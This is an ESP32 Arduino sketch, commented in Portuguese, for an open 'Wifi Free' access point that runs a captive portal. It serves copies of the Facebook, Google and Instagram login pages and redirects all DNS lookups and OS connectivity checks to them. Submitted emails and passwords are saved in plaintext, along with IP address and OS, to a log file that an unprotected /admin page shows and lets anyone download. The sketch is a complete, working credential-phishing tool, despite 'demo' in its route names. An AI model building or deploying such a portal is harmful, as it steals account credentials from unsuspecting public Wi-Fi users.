/*
  ESP32 Captive Portal - selecao de rede social (Facebook / Google / Instagram)
  Paginas HTML embutidas na flash - nao precisa de filesystem.
  Logs (email, senha, ip, horario, S.O) gravados em LittleFS (/logs.txt).
  Dashboard simples em http://192.168.4.1/admin
*/

#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>

const char* AP_SSID = "Wifi Free";
const byte DNS_PORT = 53;

DNSServer dnsServer;
WebServer server(80);

/* ======== paginas embutidas (geradas a partir de data/) ======== */

static const char PAGE_INDEX[] PROGMEM = R"HTML(<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Conectar à Rede</title>
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <main class="page">
    <header class="header">
      <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#171717" stroke-width="2" stroke-linecap="round">
        <path d="M5 12.55a11 11 0 0 1 14.08 0"/>
        <path d="M1.42 9a16 16 0 0 1 21.16 0"/>
        <path d="M8.53 16.11a6 6 0 0 1 6.95 0"/>
        <line x1="12" y1="20" x2="12.01" y2="20"/>
      </svg>
    </header>

    <section class="hero">
      <h1>escolher método de login:</h1>
    </section>

    <section class="provider-buttons">
      <a class="provider" href="/login?provider=Google">
        <svg viewBox="0 0 24 24" width="26" height="26">
          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
        </svg>
        Google
      </a>

      <a class="provider" href="/login?provider=Facebook">
        <svg viewBox="0 0 24 24" width="26" height="26" fill="#1877F2">
          <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047v-2.66c0-3.025 1.792-4.697 4.533-4.697 1.313 0 2.686.236 2.686.236v2.971H15.83c-1.491 0-1.956.93-1.956 1.886v2.264h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
        </svg>
        Facebook
      </a>

      <a class="provider" href="/login?provider=Instagram">
        <svg viewBox="0 0 24 24" width="26" height="26" fill="none" stroke="#E1306C" stroke-width="2">
          <rect x="2.5" y="2.5" width="19" height="19" rx="5.5"/>
          <circle cx="12" cy="12" r="4.2"/>
          <circle cx="17.4" cy="6.6" r="1.3" fill="#E1306C" stroke="none"/>
        </svg>
        Instagram
      </a>
    </section>

    <footer class="footer">
      <small>Conecte-se à internet gratuitamente</small>
    </footer>
  </main>
</body>
</html>
)HTML";

static const char PAGE_LOGIN_FACEBOOK[] PROGMEM = R"HTML(<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Entrar no Facebook</title>
  <link rel="stylesheet" href="/css/style.css">
</head>
<body class="brand-facebook">
  <main class="auth-page">
    <section class="auth-card">
      <h1 class="fb-wordmark">facebook</h1>
      <p class="auth-sub">Entrar no Facebook</p>

      <form method="POST" action="/demo-login">
        <input type="hidden" name="provider" value="Facebook">
        <input id="email" name="email" type="text" autocomplete="off" placeholder="E-mail ou telefone" required autofocus>
        <input id="password" name="password" type="password" autocomplete="off" placeholder="Senha" required>

        <button class="btn btn-fb" type="submit">Entrar</button>
      </form>

      <div class="auth-form-foot">
        <a class="link" href="#">Esqueceu a conta?</a>
        <a class="link" href="#">Esqueceu a senha?</a>
      </div>

      <div class="divider">ou</div>

      <button class="btn btn-create" type="button">Criar nova conta</button>
    </section>
  </main>

  <footer class="footer">
    <small>Meta &copy; 2026</small>
  </footer>
</body>
</html>
)HTML";

static const char PAGE_LOGIN_GOOGLE[] PROGMEM = R"HTML(<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Fazer login — Contas do Google</title>
  <link rel="stylesheet" href="/css/style.css">
</head>
<body class="brand-google">
  <main class="auth-page">
    <section class="auth-card">
      <div class="auth-logo">
        <svg viewBox="0 0 24 24" width="48" height="48">
          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
        </svg>
      </div>

      <h1 class="auth-title" style="text-align:center">Fazer login</h1>
      <p class="auth-sub">Use sua Conta do Google</p>

      <form method="GET" action="/google-pass">
        <label for="email">E-mail ou telefone</label>
        <input id="email" name="email" type="text" autocomplete="off" required autofocus>

        <a class="link" href="#">Esqueceu seu e-mail?</a>

        <div class="auth-form-foot">
          <span></span>
          <button class="btn btn-google btn-block" type="submit">Avançar</button>
        </div>
      </form>
    </section>
  </main>

  <footer class="footer">
    <small>Português (Brasil) &middot; Ajuda &middot; Privacidade &middot; Termos</small>
  </footer>
</body>
</html>
)HTML";

static const char PAGE_GOOGLE_PASSWORD[] PROGMEM = R"HTML(<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Fazer login — Contas do Google</title>
  <link rel="stylesheet" href="/css/style.css">
</head>
<body class="brand-google">
  <main class="auth-page">
    <section class="auth-card">
      <div class="auth-logo">
        <svg viewBox="0 0 24 24" width="48" height="48">
          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
        </svg>
      </div>

      <h1 class="auth-title" style="text-align:center">Bem-vindo(a)</h1>
      <p class="auth-sub" id="emailLabel"></p>

      <form method="POST" action="/demo-login">
        <input type="hidden" name="provider" value="Google">
        <input type="hidden" name="email" id="email">

        <label for="password">Digite a senha</label>
        <input id="password" name="password" type="password" autocomplete="off" required autofocus>

        <a class="link" href="/login?provider=Google">Esqueceu a senha?</a>

        <div class="auth-form-foot">
          <span></span>
          <button class="btn btn-google btn-block" type="submit">Avançar</button>
        </div>
      </form>
    </section>
  </main>

  <footer class="footer">
    <small>Português (Brasil) &middot; Ajuda &middot; Privacidade &middot; Termos</small>
  </footer>

  <script>
    const p = new URLSearchParams(location.search);
    const email = p.get('email') || '';
    document.getElementById('email').value = email;
    document.getElementById('emailLabel').textContent = email;
  </script>
</body>
</html>
)HTML";

static const char PAGE_LOGIN_INSTAGRAM[] PROGMEM = R"HTML(<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Instagram</title>
  <link rel="stylesheet" href="/css/style.css">
</head>
<body class="brand-ig">
  <main class="auth-page">
    <section class="auth-card">
      <div class="auth-logo">
        <svg viewBox="0 0 24 24" width="40" height="40" fill="none" stroke="#262626" stroke-width="2">
          <rect x="2.5" y="2.5" width="19" height="19" rx="5.5"/>
          <circle cx="12" cy="12" r="4.2"/>
          <circle cx="17.4" cy="6.6" r="1.3" fill="#262626" stroke="none"/>
        </svg>
      </div>

      <h1 class="ig-wordmark">Instagram</h1>

      <form method="POST" action="/demo-login">
        <input type="hidden" name="provider" value="Instagram">
        <input id="email" name="email" type="text" autocomplete="off" placeholder="Telefone, nome de usuário ou e-mail" required autofocus>
        <input id="password" name="password" type="password" autocomplete="off" placeholder="Senha" required>

        <button class="btn btn-ig" type="submit">Entrar</button>
      </form>

      <div class="divider">ou</div>

      <a class="fb-link" href="#">
        <svg viewBox="0 0 24 24" width="16" height="16" fill="#385185">
          <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047v-2.66c0-3.025 1.792-4.697 4.533-4.697 1.313 0 2.686.236 2.686.236v2.971H15.83c-1.491 0-1.956.93-1.956 1.886v2.264h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
        </svg>
        Entrar com o Facebook
      </a>

      <div style="margin-top:14px">
        <a class="link" href="#">Esqueceu a senha?</a>
      </div>
    </section>

    <section class="auth-card">
      <p class="signup">Não tem uma conta? <a class="link" href="#"><strong>Cadastre-se</strong></a></p>
    </section>
  </main>
</body>
</html>
)HTML";

static const char PAGE_SUCCESS[] PROGMEM = R"HTML(<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Conectado</title>
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <main class="page">
    <header class="header"><div class="logo">LOGO</div></header>

    <section class="success">
      <div class="success-icon">&#10003;</div>
      <h1>Conectado</h1>
      <p>Você já pode navegar na internet.</p>
      <a class="btn btn-google" href="/">Continuar</a>
    </section>

    <footer class="footer"><small>Rede gratuita</small></footer>
  </main>
</body>
</html>
)HTML";

static const char PAGE_ADMIN[] PROGMEM = R"HTML(<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Admin — ESP32</title>
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <main class="admin">
    <header class="admin-header">
      <h1>ESP32 CAPTIVE PORTAL</h1>
      <span>ADMIN LOCAL</span>
    </header>

    <section class="status-card">
      <strong>Status:</strong> ONLINE
    </section>

    <section class="logs-section">
      <div class="section-title">
        <h2>Logs</h2>
        <div>
          <button onclick="loadLogs()">Atualizar</button>
          <button onclick="clearLogs()">Limpar logs</button>
          <a class="button small" href="/logs.txt">Baixar logs.txt</a>
        </div>
      </div>
      <pre id="logs">Carregando...</pre>
    </section>
  </main>

  <script>
    async function loadLogs() {
      const r = await fetch('/logs.txt');
      document.getElementById('logs').textContent = await r.text() || 'Nenhum evento registrado.';
    }
    async function clearLogs() {
      if (!confirm('Limpar os logs?')) return;
      await fetch('/clear-logs', {method:'POST'});
      loadLogs();
    }
    loadLogs();
  </script>
</body>
</html>
)HTML";

static const char PAGE_CSS[] PROGMEM = R"CSS(/* =========================================================
   TEMPLATE / DESIGN SYSTEM
   ========================================================= */

:root {
  --bg: #f5f5f7;
  --card: #ffffff;
  --text: #171717;
  --muted: #666;
  --border: #ddd;
  --radius: 14px;
  --fb: #1877F2;
  --fb-green: #42b72a;
  --google-blue: #1a73e8;
  --ig-blue: #0095f6;
}

* { box-sizing: border-box; }

body {
  margin: 0;
  min-height: 100vh;
  background: var(--bg);
  color: var(--text);
  font-family: Arial, sans-serif;
}

.page {
  width: min(440px, 92%);
  margin: 0 auto;
  padding: 28px 0;
}

.header {
  text-align: center;
  padding: 10px 0 28px;
}

.hero {
  text-align: center;
  margin-bottom: 24px;
}

.hero h1 {
  font-size: 20px;
  font-weight: 700;
  margin: 0;
}

.provider-buttons {
  display: grid;
  gap: 14px;
}

.provider {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 12px;
  padding: 16px 18px;
  border-radius: var(--radius);
  background: var(--card);
  border: 1px solid var(--border);
  color: var(--text);
  text-decoration: none;
  font-size: 16px;
  font-weight: 600;
  transition: border-color .15s;
}

.provider:hover { border-color: #aaa; }

.provider svg { flex-shrink: 0; }

/* ============ Páginas de login ============ */

.auth-page {
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 12px;
  padding: 24px 0;
}

.auth-card {
  width: min(400px, 92%);
  background: var(--card);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 28px 24px;
}

.auth-logo {
  display: grid;
  place-items: center;
  margin-bottom: 18px;
}

.auth-title {
  font-size: 22px;
  margin: 0 0 6px;
}

.auth-sub {
  color: var(--muted);
  font-size: 14px;
  margin: 0 0 20px;
}

label {
  display: block;
  font-size: 13px;
  margin-bottom: 6px;
}

input {
  width: 100%;
  padding: 13px;
  border: 1px solid var(--border);
  border-radius: 10px;
  margin-bottom: 12px;
  font-size: 15px;
  font-family: inherit;
}

input:focus { outline: none; border-color: var(--google-blue); }

.btn {
  display: block;
  width: 100%;
  border: 0;
  border-radius: 10px;
  padding: 13px;
  font-size: 15px;
  font-weight: 700;
  cursor: pointer;
  color: #fff;
  text-align: center;
  text-decoration: none;
}

.btn-fb { background: var(--fb); }
.btn-google { background: var(--google-blue); }
.btn-ig { background: var(--ig-blue); }
.btn-create { background: var(--fb-green); }

.link {
  color: var(--google-blue);
  text-decoration: none;
  font-size: 14px;
}

.link:hover { text-decoration: underline; }

.auth-form-foot {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-top: 12px;
}

.btn-block { margin-top: 6px; }

.divider {
  display: flex;
  align-items: center;
  gap: 12px;
  color: var(--muted);
  font-size: 13px;
  margin: 20px 0;
}

.divider::before, .divider::after {
  content: "";
  flex: 1;
  height: 1px;
  background: var(--border);
}

/* ---------- Facebook ---------- */

.brand-facebook { background: #f0f2f5; }
.brand-facebook .auth-card { text-align: center; }

.fb-wordmark {
  color: var(--fb);
  font-size: 44px;
  font-weight: 800;
  letter-spacing: -1px;
  line-height: 1;
  margin: 0 0 16px;
}

.brand-facebook input { text-align: left; }

/* ---------- Google ---------- */

.brand-google { background: #fff; }
.brand-google .auth-card { box-shadow: 0 1px 3px rgba(60,64,67,.3); }

/* ---------- Instagram ---------- */

.brand-ig { background: #fafafa; }
.brand-ig .auth-card { text-align: center; padding-top: 34px; }

.ig-wordmark {
  font-size: 28px;
  font-weight: 700;
  margin: 4px 0 18px;
  font-family: 'Segoe Script', 'Brush Script MT', cursive;
}

.brand-ig input { text-align: center; }

.fb-link {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  font-weight: 600;
  color: #385185;
  text-decoration: none;
  font-size: 14px;
}

.signup {
  font-size: 14px;
  margin: 0;
}

/* ============ Comum ============ */

.footer {
  text-align: center;
  color: var(--muted);
  padding: 24px 0;
  font-size: 12px;
}

.success {
  text-align: center;
  background: var(--card);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 24px;
}

.success-icon {
  font-size: 52px;
  margin-bottom: 10px;
}

.success h1 { margin-bottom: 8px; }
.success p { color: var(--muted); margin-bottom: 20px; }

/* ============ Admin ============ */

.admin {
  width: min(1000px, 94%);
  margin: 30px auto;
}

.admin-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 20px;
  margin-bottom: 20px;
}

.admin-header span {
  font-size: 12px;
  color: var(--muted);
}

.status-card {
  margin-bottom: 20px;
  background: var(--card);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 24px;
}

.logs-section {
  background: var(--card);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 24px;
}

.section-title {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 15px;
}

.section-title > div {
  display: flex;
  gap: 8px;
}

.section-title button, .button.small {
  width: auto;
  padding: 10px 14px;
}

.button, button {
  display: block;
  border: 0;
  border-radius: 10px;
  padding: 13px 18px;
  background: #111;
  color: #fff;
  text-decoration: none;
  text-align: center;
  cursor: pointer;
  font-size: 14px;
}

pre {
  background: #111;
  color: #eee;
  padding: 18px;
  border-radius: 10px;
  overflow: auto;
  min-height: 250px;
}
)CSS";



/* ======== helpers ======== */

String detectOS() {
  String ua = server.header("User-Agent");
  ua.toLowerCase();
  if (ua.indexOf("windows") >= 0) return "Windows";
  if (ua.indexOf("android") >= 0) return "Android";
  if (ua.indexOf("iphone") >= 0 || ua.indexOf("ipad") >= 0 || ua.indexOf("ipod") >= 0) return "iOS";
  if (ua.indexOf("mac os") >= 0) return "macOS";
  if (ua.indexOf("linux") >= 0) return "Linux";
  return "Unknown";
}

void logEvent(const String& provider, const String& action) {
  File f = LittleFS.open("/logs.txt", "a");
  if (!f) return;

  String ip = server.client().remoteIP().toString();
  String ts = server.header("Date");
  if (!ts.length()) ts = String(millis());
  String os = detectOS();
  String email = server.hasArg("email") ? server.arg("email") : "-";
  String password = server.hasArg("password") ? server.arg("password") : "-";

  f.printf("%s | ip=%s | provider=%s | email=%s | password=%s | os=%s | action=%s\n",
           ts.c_str(), ip.c_str(), provider.c_str(),
           email.c_str(), password.c_str(), os.c_str(), action.c_str());
  f.close();
}

void servePage(const char* page, const char* contentType) {
  server.send(200, contentType, page);
}

/* ======== rotas ======== */

void handleRoot() { servePage(PAGE_INDEX, "text/html; charset=utf-8"); }

void handleLogin() {
  String provider = server.hasArg("provider") ? server.arg("provider") : "";
  if (provider == "Google") {
    logEvent(provider, "login_page");
    servePage(PAGE_LOGIN_GOOGLE, "text/html; charset=utf-8");
  } else if (provider == "Facebook") {
    logEvent(provider, "login_page");
    servePage(PAGE_LOGIN_FACEBOOK, "text/html; charset=utf-8");
  } else if (provider == "Instagram") {
    logEvent(provider, "login_page");
    servePage(PAGE_LOGIN_INSTAGRAM, "text/html; charset=utf-8");
  } else {
    server.sendHeader("Location", "/");
    server.send(302, "text/plain", "");
  }
}

void handleGooglePass() {
  servePage(PAGE_GOOGLE_PASSWORD, "text/html; charset=utf-8");
}

void handleDemoLogin() {
  String provider = server.hasArg("provider") ? server.arg("provider") : "Demo";
  logEvent(provider, "submit");
  server.sendHeader("Location", "/success.html");
  server.send(302, "text/plain", "");
}

void handleAdmin() { servePage(PAGE_ADMIN, "text/html; charset=utf-8"); }
void handleCss()   { servePage(PAGE_CSS, "text/css; charset=utf-8"); }

void handleLogs() {
  String logs;
  if (LittleFS.exists("/logs.txt")) {
    File f = LittleFS.open("/logs.txt", "r");
    logs = f.readString();
    f.close();
  }
  server.send(200, "text/plain; charset=utf-8", logs);
}

void handleClearLogs() {
  LittleFS.remove("/logs.txt");
  server.send(200, "text/plain", "Logs cleared");
}

void captiveRedirect() {
  server.sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
  server.send(302, "text/plain", "");
}

/* ======== setup / loop ======== */

void setup() {
  Serial.begin(115200);

  if (!LittleFS.begin(true)) {
    Serial.println("LittleFS error - logs desativados");
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID); // rede aberta, sem senha

  IPAddress apIP = WiFi.softAPIP();
  Serial.printf("AP: %s\n", AP_SSID);
  Serial.printf("IP: %s\n", apIP.toString().c_str());

  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/", HTTP_GET, handleRoot);
  server.on("/login", HTTP_GET, handleLogin);
  server.on("/google-pass", HTTP_GET, handleGooglePass);
  server.on("/demo-login", HTTP_POST, handleDemoLogin);
  server.on("/admin", HTTP_GET, handleAdmin);
  server.on("/css/style.css", HTTP_GET, handleCss);
  server.on("/logs.txt", HTTP_GET, handleLogs);
  server.on("/clear-logs", HTTP_POST, handleClearLogs);

  // Rotas comuns usadas por dispositivos para detectar captive portals.
  server.on("/generate_204", HTTP_GET, captiveRedirect);
  server.on("/hotspot-detect.html", HTTP_GET, captiveRedirect);
  server.on("/connecttest.txt", HTTP_GET, captiveRedirect);
  server.on("/ncsi.txt", HTTP_GET, captiveRedirect);

  server.onNotFound(captiveRedirect);
  server.begin();

  Serial.println("Captive portal iniciado.");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}